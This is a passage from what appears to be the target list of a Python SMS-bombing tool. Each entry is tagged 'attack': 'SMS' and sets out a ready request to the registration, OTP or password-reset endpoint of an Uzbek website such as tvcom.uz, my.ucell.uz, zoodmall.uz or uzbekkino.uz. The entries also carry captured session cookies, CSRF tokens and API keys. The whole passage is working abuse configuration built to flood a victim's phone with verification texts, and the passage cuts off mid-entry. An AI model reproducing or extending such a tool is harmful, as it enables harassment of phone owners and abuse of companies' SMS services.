            'cookies': {'PHPSESSID': 'ae4a429f52f5c056bafedb74c551e344', 'BITRIX_SM_GUEST_ID': '4196914', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A33%2C%22EXPIRE%22%3A1679943540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'tm_recieved_messages': '{"info":1}', 'BX_USER_ID': 'b66d5083fb267e980fd309db98effd2f', 'BITRIX_SM_LAST_VISIT': '27.03.2023+19%3A27%3A30',},
            'headers': {'authority': 'kinopro.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://kinopro.uz', 'referer': 'https://kinopro.uz/login.php?login=yes&back=%2F', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'handler': 'AuthAjaxHandler', 'func': 'sendRegisterFields', 'phone': number, 'name': 'User',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'TVCOM.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://mw.tvcom.uz/tvmiddleware/api/account/register/?client_id=1&api_key=56JNSqNT&send_sms=1&mobile_phone_number={number}&device=browser&comment=from+browser&device_uid=%7B%22data%22:%2231.148.101.236%22%7D&device_model=browser',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Origin': 'https://tvcom.uz', 'Referer': 'https://tvcom.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'TVCOM.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': 'https://mw.tvcom.uz/tvmiddleware/api/account/reset_password/',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Origin': 'https://tvcom.uz', 'Referer': 'https://tvcom.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'params': {'client_id': '1', 'api_key': '56JNSqNT', 'mobile_phone_number': number,},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Prep.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://prep.uz/register',
            'cookies': {'_ym_uid': '1679920042327713127', '_ym_d': '1679920042', '_ga': 'GA1.1.1277404490.1679920043', '_ym_isad': '1', 'XSRF-TOKEN': 'eyJpdiI6IlwvYkVhdGFwK2FpS3BtOW5xTGMxMVFRPT0iLCJ2YWx1ZSI6IkhiNGxkZ0hEZnFiYXhGZkxKeVJiZXFJK2FHNUZCcnRQRDdJNUlqelV1K3ZEc2x1MFFpMk8yQk5iaWNaUDc3XC9yIiwibWFjIjoiZmIxZGY0ZTJhZWI1ZmY4N2ZiZjgxZjE3ODI4MzU0Yjk1MDhmMzRiMzY3Njc1YmFmMTk1OTMzZTRjNzhjMzI3MSJ9', 'prepuz_session': 'eyJpdiI6InFcL1FveGZjRHpLaU0xc3B1dFNYaWpnPT0iLCJ2YWx1ZSI6ImVrRDcrSzdOXC9EaXdMRXRtblIzWVpKNmZ6TWNVV1ptWjZ5OVkzV3RpM0lrZm9TM2hkMjVRdzlEMTlObGFWNUlkIiwibWFjIjoiYjAxOTg4ZTVjYjFlMmQ5OWQ2YmFiZmI2OTA0NzFlNDU4MDhkODAyYTkzYjU3NjAxYTJlNmE0OTUyYWFiN2E4ZSJ9', '_ym_visorc': 'w', '_ga_9E5D180230': 'GS1.1.1679931088.2.0.1679931088.0.0.0',},
            'headers': {'authority': 'prep.uz', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://prep.uz', 'referer': 'https://prep.uz/ru', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'name={number}&_token=lVnX70uREb87usOMwjzXLTdoSX0L8pcgrMN2jzb7',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'TEZELON.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://tezelon.uz/ru/accounts/register-ajax/',
            'cookies': {'region': 'all', 'csrftoken': 'aTsO9b9IpCKXRFXzDVRMemPkwPOpqAMFKCM8uPFbChQ6spFZnmZdWrdmevTvY4Yo', '_ym_uid': '1679920814347340323', '_ym_d': '1679920814', '_ga': 'GA1.1.1104312177.1679920814', '_gcl_au': '1.1.1505458585.1679920814', '_ym_isad': '1', '_ga_5MXLPZJW72': 'GS1.1.1679931542.2.0.1679931542.60.0.0', '_ym_visorc': 'w',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://tezelon.uz', 'Referer': 'https://tezelon.uz/ru/accounts/register/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'first_name': '', 'phone_number': str(number)[3:], 'csrfmiddlewaretoken': 'PIReBmvb1gtuFyFupJ9QGiJp6WjYass8prbyW01EeVzDginU9ahhon7rOCo4IWER',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Bizzon.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://bizzon.uz/kuponator&api=send_reg_confirm_sms',
            'cookies': {'php-console-server': '5', 'PHPSESSID': 'o46k87g6d9ncchp1k5et9a35q0', 'location': '24', 'lang': 'ru', '_ga': 'GA1.2.1709351193.1679922402', '_gid': 'GA1.2.1863634848.1679922402', '_ym_uid': '1679922402680240484', '_ym_d': '1679922402', '_ym_isad': '1', 'form_auth_close': '1', '_gat_gtag_UA_129893493_1': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://bizzon.uz', 'Referer': 'https://bizzon.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'phone': number,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Zor.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.zor.uz/user/registration',
            'cookies': {'PHPSESSID': 'otmsr9vm15hvsi5susqasqes54', '_gcl_au': '1.1.1152574776.1679923955', '_ym_uid': '1679933667983818151', '_ym_d': '1679933667', '_ym_isad': '1', '_ga': 'GA1.1.260603301.1679933667', '_ym_visorc': 'w', '_ga_VPP9LD9LS9': 'GS1.1.1679933666.1.1.1679933984.0.0.0',},
            'headers': {'authority': 'api.zor.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'app': 'web', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.zor.uz', 'referer': 'https://www.zor.uz/registration', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'data': {'phone': str(number)[3:],},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uybor.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.uybor.uz/api/v1/auth/code',
            'headers': {'authority': 'api.uybor.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://uybor.uz', 'referer': 'https://uybor.uz/', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'My.Ucell.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://my.ucell.uz/Account/GetOtpBySms',
            'cookies': {'mpg': '0a40870dd4a1502dcd7a9213f6c2b56c9b8a6694%7E1', 'fs': '5013df61258bdd13d57ac7efe5e25fc4cb997178%7E1680105284', '_ga': 'GA1.2.886448699.1680105317', '_gid': 'GA1.2.504332318.1680105317', '_gat_gtag_UA_154678057_1': '1', 'lang': '881091c4b8d7536c7a80a7748ff0af75a3db18b2%7Eru', '_culture': 'ru', '_gat': '1',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://my.ucell.uz', 'Referer': 'https://my.ucell.uz/Account/Login?ReturnUrl=%2f', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'phone': number,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'UZ.VesnaPromo.me', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://gateway.vpluse.me/v2/client/nauryz/action/phone-preregistratioin',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary3FKQ1xKuWsu1HPJo', 'Origin': 'https://uz.vesnapromo.me', 'Referer': 'https://uz.vesnapromo.me/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundary3FKQ1xKuWsu1HPJo\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundary3FKQ1xKuWsu1HPJo--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Zoodmall.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.zoodmall.uz/api/generate-otp',
            'cookies': {'auth.deviceId': 'e8f146a9-973c-40dd-bb2d-05254712989e', 'auth.i18n_locale': '', 'auth.strategy': 'local', '_ym_uid': '1685980606551696925', '_ym_d': '1685980606', '_ym_visorc': 'w', '_ym_isad': '1', '_gid': 'GA1.2.2018812530.1685980607', '_dc_gtm_UA-111126367-11': '1', '_ga': 'GA1.1.31747395.1685980607', '_ga_WR7RMLDB31': 'GS1.1.1685980607.1.0.1685980607.60.0.0', '_ga_HHPFN2V63R': 'GS1.1.1685980607.1.1.1685980623.44.0.0', 'XSRF-TOKEN': 'eyJpdiI6IlNWcHpHcmViT3lIS0xUcmE0V1ltV0E9PSIsInZhbHVlIjoiOUlNOG5mUHhwSWJpdmFaY1BqWnNUWUcvSWZhOWNUNmxmN29zWG9qczFCTGVYemQxSnQwS3BETmJiQTFxemRxNTRhRTlmaXR5YU80bXBuY1VBNG9YcFZsY01HZ3BvdWx1N3V5bHRRaTNxa1A2c0VTbERoYzE5RGZiNUFZVVEyMlciLCJtYWMiOiIxYjhmMDI0YTMwNWYzZDBkMGZkZmI1NTA0NGE3OGQ1YTIyMTZkNmFiNzYwYWQ0NGQzMGQ2MTIzODg3MzdiZTE2In0%3D', 'laravel_session': 'eyJpdiI6Ilh4V0YwdmY2eFNoczZxRWpCdTllMkE9PSIsInZhbHVlIjoiNUtSN0ZtYzd1c2hSN1gxVGNXNDV0MFp2b0U3RXJUTVB5K2F5UlBMeVlQdnZaRC9lOVRqdm5zWGpxc2VURVBPSXR4cDNHRkc2OHlGMjVhcWdDMWxjRjNDMkRjVTJBbjlqQnd6TlpiRy9SMTF1SFdGR3FxYVFxYU94UmNoWDZyQlAiLCJtYWMiOiIzMGJiZmZlOTBhZDg5MjdjYTJhOTk5YTQzMzU1ZmE5MzliNTRhMmYyZDQ5NTIyZGZhMDgzYzUyMGNkMzc1OGY1In0%3D', '__cf_bm': 'qTl9yPu1Bi1wQY7nZjX2pyzBIHIaTfiIMINz78IOexk-1685980631-0-ARCc7A2qaPQLGk937NKVwYMn78UItskpAGoGISEEWRlEIy4oW1qs6ZV9Qa6BIvb2w%2B9pqwUAPrbbhmC0gWr%2BRDI',},
            'headers': {'authority': 'www.zoodmall.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'deviceid': 'e8f146a9-973c-40dd-bb2d-05254712989e', 'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIyMTMzMTAiLCJhcCI6IjIzNzU4MDYwNiIsImlkIjoiODI4YmExMmUyMDI2NzI1YiIsInRyIjoiNGI4NjQzMmQwOGI3YWU3ZWQwMGM2N2FkNjhhZjk0NjAiLCJ0aSI6MTY4NTk4MDYyNjk0Mn19', 'origin': 'https://www.zoodmall.uz', 'referer': 'https://www.zoodmall.uz/ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'ssr': 'false', 'traceparent': '00-4b86432d08b7ae7ed00c67ad68af9460-828ba12e2026725b-01', 'tracestate': '2213310@nr=0-1-2213310-237580606-828ba12e2026725b----1685980626942', 'user-agent': user_agent()[1], 'x-lang': 'ru', 'x-marketcode': 'UZ', 'x-xsrf-token': 'eyJpdiI6IlNWcHpHcmViT3lIS0xUcmE0V1ltV0E9PSIsInZhbHVlIjoiOUlNOG5mUHhwSWJpdmFaY1BqWnNUWUcvSWZhOWNUNmxmN29zWG9qczFCTGVYemQxSnQwS3BETmJiQTFxemRxNTRhRTlmaXR5YU80bXBuY1VBNG9YcFZsY01HZ3BvdWx1N3V5bHRRaTNxa1A2c0VTbERoYzE5RGZiNUFZVVEyMlciLCJtYWMiOiIxYjhmMDI0YTMwNWYzZDBkMGZkZmI1NTA0NGE3OGQ1YTIyMTZkNmFiNzYwYWQ0NGQzMGQ2MTIzODg3MzdiZTE2In0=',},
            'json': {'mobile': f'+{number}',},
            'params': {'platform': 'web',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Faberlic.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://nad-faberlic.ru/api-new/submit',
            'cookies': {'PHPSESSID': 'ebff8b71d3b8f733bb1875324c7cbdda', '_csrf': 'b7e5c71efb4a8c95b914bc75548a431fecc68e244b790974a206cb7fea83e533a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22nX7HVQWWqjAy5hHLo1Ec3dLrCsCTXFLy%22%3B%7D', '_ym_uid': '1685981597253581584', '_ym_d': '1685981597', '_ym_isad': '1', '_gid': 'GA1.2.1253993156.1685981598', '_ga_SJQ8BKGXP0': 'GS1.1.1685981598.1.0.1685981598.0.0.0', '_ym_visorc': 'b', '_ga': 'GA1.2.634319184.1685981598', '_gat_UA-154434566-1': '1',},
            'headers': {'authority': 'nad-faberlic.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://nad-faberlic.ru', 'referer': 'https://nad-faberlic.ru/733776567/catalog/mlm/29254?utm_source=yandex%D0%BA%D0%B0%D1%82%D0%B0%D0%BB%D0%BE%D0%B3vsestrani%D0%BC%D1%83%D1%81%D0%BD%D0%B5&utm_medium=cpc&utm_campaign=82689700&utm_content=14051667259&utm_term=---autotargeting&etext=2202.h_6tBBeiD0sayn_WiYwtocjOowm1WeEoYyx0BIgdWDEBqIaWpyEBU2qo802a_Z7MdXFrZG1rZWFyaG9la2Jndw.a201fc5215043a4adaa13c6fa1b8825a77a9b9df&yclid=3095606298469538380', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': 'xemoaHbtQeUTPJOPZMpC6IIR1AvNb8zi_wH7cKs8h8ersZ8gILwWsmJW0vZRogqk7SCRaP4LgJC8crgk83rLvg==', 'x-requested-with': 'XMLHttpRequest',},
            'data': f'_csrf=xemoaHbtQeUTPJOPZMpC6IIR1AvNb8zi_wH7cKs8h8ersZ8gILwWsmJW0vZRogqk7SCRaP4LgJC8crgk83rLvg%3D%3D&action=sms&RegForm%5Buser_id%5D=733776567&RegForm%5Bbranch_id%5D=29254&RegForm%5Bset_id%5D=&RegForm%5Btype%5D=2&RegForm%5Bclient_id%5D=1685981597253581584&RegForm%5Butm_source%5D=yandex%D0%BA%D0%B0%D1%82%D0%B0%D0%BB%D0%BE%D0%B3vsestrani%D0%BC%D1%83%D1%81%D0%BD%D0%B5&RegForm%5Butm_medium%5D=cpc&RegForm%5Butm_content%5D=14051667259&RegForm%5Butm_term%5D=---autotargeting&RegForm%5Bsponsor_id%5D=736636233&RegForm%5Bsex%5D=f&RegForm%5Breturn_url%5D=https%3A%2F%2Ffaberlic.com&RegForm%5Bcountry_id%5D=26&RegForm%5Bsurname%5D=Name&RegForm%5Bname%5D=User&RegForm%5Bpatronymic%5D=Names&RegForm%5Bbirthday%5D=11.11.1991&RegForm%5Bemail%5D={email()}&RegForm%5Bphone%5D={number}&RegForm%5Bcode%5D=',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Bulavka.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://bulavka.uz/api/userservice/phone',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://bulavka.uz', 'Referer': 'https://bulavka.uz/auth/login', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'RizaNova.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://rizanova.uz/api/signup',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://rizanova.uz', 'Referer': 'https://rizanova.uz/ru/film', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'username': f'+{number}', 'email': email(), 'password': 'ziS-xfk-UDz-Ex4', 'repeat_password': 'ziS-xfk-UDz-Ex4', 'full_name': 'User Names Name', 'code': '',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uzbekkino.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.uzbekkino.uz/v1/users.json',
            'headers': {'authority': 'api.uzbekkino.uz', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://uzbekkino.uz', 'referer': 'https://uzbekkino.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'username': f'+{number}', 'password': 'sghaskiafshfoashd', 'type': 'msisdn', 'metadata': {'allow_notifications': True,},},
            'params': {'client_id': '66797942-ff54-46cb-a109-3bae7c855370', 'client_version': '4.3.0-10', 'locale': 'uz-UZ', 'timezone': '18000',},
            # Регистрация по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uzbekkino.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.uzbekkino.uz/v1/users/passwords/codes.json',
            'headers': {'authority': 'api.uzbekkino.uz', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://uzbekkino.uz', 'referer': 'https://uzbekkino.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'username': f'+{number}',},
            'params': {'client_id': '66797942-ff54-46cb-a109-3bae7c855370', 'client_version': '4.3.0-10', 'locale': 'uz-UZ', 'timezone': '18000',},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'MediaPark.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.auth.newmediapark.uz/login-otp',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://mediapark.uz', 'Referer': 'https://mediapark.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': '{"role_id":"06d63125-e7a2-4616-afa4-cd50ee3ac33d","language":"ru","username":"+' + str(number) + '","source":"web"}',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Allgood.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://allgood.uz/register',
            'cookies': {'wishlist_session_key': 'eyJpdiI6IlQzMXpET3A3RnErTGtmTHQ1bHR0UUE9PSIsInZhbHVlIjoiUE9hd0V5R2xlNWFlZW9tQ1p0NzBmWVZVRDJ3My85MXBmWmFwRCt1bkdOR09uSEI2QW0wRXNJZFZJbEJ4VTB1MUY2TmRtc2gxcUJHQk4rNURyZCttM2E0YWNVV1pSazlvd2xrSGU5M1BoZUk9IiwibWFjIjoiYmUzMGQ0ZWYyOTM1NTBlYWU4NjRkZGQ1OWY2ZmIzZTIzMzczYzIyZThhMTViYTQ1OTY0YWMzZmZmOTc5MjBmYSIsInRhZyI6IiJ9', 'cart_session_key': 'eyJpdiI6Imh0QXdPUDVBOEgvUHA1VGFHUXBCK1E9PSIsInZhbHVlIjoiUzFFdmVVOUY0ZjB3d0RHQmh1c2g4Ujl3VVZNeDlRb0xMekw3Z2xkTURTTk1RanluTVhKMVovdWZvWCtLUXdJMU1KZ05xbHVaV3lPRG1uejNRcldsWUh2ZC9jeDRmTFAyNEp3SVVaZnNRUG89IiwibWFjIjoiZTA1ZjQ0NmUxOGQzMzM1MDFmYzE0YjNjNDFkYjFlZTg1MTJjOGFhYjM2Y2ExYTA5M2Q2ZDVhZGJiZTgxYTBhMSIsInRhZyI6IiJ9', 'compare_session_key': 'eyJpdiI6InRieHE1KzlhZFJZMTNtUlJvcERrSXc9PSIsInZhbHVlIjoiREtvd3R4bTRIMFZ4VVFVYVduaXRMOGxibDlkblRmdGhUdzFOTnRySHUxd0pyU0hPYWRmemJEeTNBZWlNZ04zOUxKSlI4Z1dtdFNDWmFOeHhCUjNOMWIvbFdHY0VtTEp3encvWWNBbHV2Ulk9IiwibWFjIjoiYjc4OWVlNTZjZjEzMTZkNGE5MjczMmVkNzZjMzdkYTg3NTE5NDYyZmU0N2U4NmFmMmY2NDU3ZjE2YzdmYmZhOCIsInRhZyI6IiJ9', '_ym_uid': '1686383290761088069', '_ym_d': '1686383290', '_ym_isad': '1', '_ym_visorc': 'w', '_gcl_au': '1.1.1372104776.1686383292', '_gid': 'GA1.2.386850365.1686383292', '_gat_UA-206395290-1': '1', '_gat_gtag_UA_206395290_1': '1', '_ga_5JQE5QF4MC': 'GS1.1.1686383292.1.1.1686383305.47.0.0', '_ga': 'GA1.1.1544799158.1686383292', 'XSRF-TOKEN': 'eyJpdiI6InBUUDZ5MUcyS29LL2FZVk9lOHA4clE9PSIsInZhbHVlIjoiVHlyZ2Uzb2FTbFFqbW81azBrOU92Qmt1Vi8yVHMzTmlqVEd4MGMzU3FCeWE0dEx1VXRQSDB3NmtvMDdVMzV6TWpZMmVuTGZhNU1pVlRBSU9ucU1pQ1dXMUs2WEErUWhvRGtzRUovT29IM0VjcmlIYUxIWS9STjNNaE1NblpKNTAiLCJtYWMiOiIyNmZmMjIyZjdhOTQwNTQ5OWQwNWYyNWFjZDBmMzg2YzRmY2VmYzUxZGZjNWE0OWEwOTI3OWNkMTE2MjFiM2MxIiwidGFnIjoiIn0%3D', 'allgooduz_session': 'eyJpdiI6Ikgwbi9sTFpyWllSVmNibGxEcTRPS2c9PSIsInZhbHVlIjoidXFvNnkyb2oxVThtWlMvUnhiNDRzbXgwZ1FJRjA3NWJXQ2dIRUgwZWIrUjNMdHZJZlFJQXJ1SUc1aDZpWFRHeHJ1S2FQdmw2TDNxcE1IWXlpWmZmV01nRW9IQlp4NDViaTBHbmZsTXVFa3d3WTZKUlBBTnhTakZqWSswT0VaVloiLCJtYWMiOiJjMTllMTE0ZWFlOGUxMzAzY2MzNWNkYjVkMDMxZjdiNzcyMGNmM2NiNmY3ZWQyNmE2Yzk5ZDM1ZTRlZWVkMzVlIiwidGFnIjoiIn0%3D', '_ga_C62FCR4M16': 'GS1.1.1686383292.1.1.1686383319.0.0.0',},
